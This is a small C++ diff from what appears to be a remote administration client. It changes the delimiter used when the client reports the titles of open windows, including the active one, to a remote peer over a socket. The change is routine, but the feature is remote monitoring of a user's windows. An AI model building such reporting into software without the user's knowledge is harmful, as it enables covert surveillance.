@@ -783,10 +783,10 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         std::string strPaquete = "";
         for (VentanaInfo ventana : this->mod_AdminVen->m_ListaVentanas()) {
             strPaquete += ventana.strTitle;
-            strPaquete += ventana.active ? " (ACTIVA)\\" : "\\";
+            strPaquete += ventana.active ? " (ACTIVA)<sap3>" : "<sap3>";
         }
         if (strPaquete.size() > 0) {
-            strPaquete.pop_back();
+            strPaquete = strPaquete.substr(0, strPaquete.size() - 6);
             this->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr, EnumComandos::WM_Lista);
         }
         return;
